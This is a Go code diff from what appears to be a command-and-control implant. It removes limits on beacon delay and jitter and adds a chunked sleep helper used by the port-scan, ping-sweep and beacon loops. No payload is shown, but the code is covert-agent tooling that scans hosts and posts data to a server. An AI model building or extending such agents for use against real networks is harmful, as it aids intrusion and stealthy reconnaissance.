@@ -942,18 +942,15 @@ func send() { //发送头部信息
         post(data, file_url)
     }
     func GET_JITTER(s_jitter string) {
-	    parsedJitter, err := strconv.Atoi(s_jitter)
-	    if err != nil || parsedJitter <= 0 {
-	        return
-	    }
-	    if parsedJitter >  3600{
-	        parsedJitter =  3600
-	    }
-	    a_Mutex.Lock();jitter = parsedJitter;a_Mutex.Unlock()
-	}
+        parsedJitter, err := strconv.Atoi(s_jitter)
+        if err != nil || parsedJitter <= 0 {
+            return
+        }
+        a_Mutex.Lock();jitter = parsedJitter;a_Mutex.Unlock()
+    }
     func GET_DELAY(s_delay string) {
         parsedTime, err := strconv.ParseInt(s_delay, 10, strconv.IntSize)
-        if err != nil || parsedTime <= 0 || parsedTime > 86400{
+        if err != nil || parsedTime <= 0{
             return
         }
         a_Mutex.Lock()
@@ -996,7 +993,7 @@ func send() { //发送头部信息
         }
         if option == "port" {
             for _, port := range port_list {
-                time.Sleep(time.Duration(sleep_time) * time.Second)
+                sleepSeconds(int64(sleep_time))
                 scan_port(ip, port, sleep_time,&resultBuilder, &mutex)
             }
         } else if option == "ping" {
@@ -1009,7 +1006,7 @@ func send() { //发送头部信息
             for _, i := range ping_list {
                 target := new_ip + i
                 for _, p := range port_list {
-                    time.Sleep(time.Duration(sleep_time) * time.Second)
+                    sleepSeconds(int64(sleep_time))
                     scan_port(target, p, sleep_time,&resultBuilder, &mutex)
                 }
             }
@@ -1245,6 +1242,20 @@ func send() { //发送头部信息
         }
         return string(result)
     }
+    func sleepSeconds(seconds int64) {
+        if seconds <= 0 {
+            return
+        }
+        const chunkSeconds int64 = 24 * 60 * 60 
+        for seconds > 0 {
+            current := seconds
+            if current > chunkSeconds {
+                current = chunkSeconds
+            }
+            time.Sleep(time.Duration(current) * time.Second)
+            seconds -= current
+        }
+    }
     func sleepdelay(){
         a_Mutex.RLock();wait := delay;jitterValue := jitter;a_Mutex.RUnlock()
         if wait < 0 {wait = 0}
@@ -1253,7 +1264,7 @@ func send() { //发送头部信息
             if err != nil {return}
             wait += int(n.Int64())
         }
-        time.Sleep(time.Duration(wait) * time.Second)
+        sleepSeconds(int64(wait))
     }
 	func generateAndUpdateKey(url string){
 		base_respBody := getUrl(url)
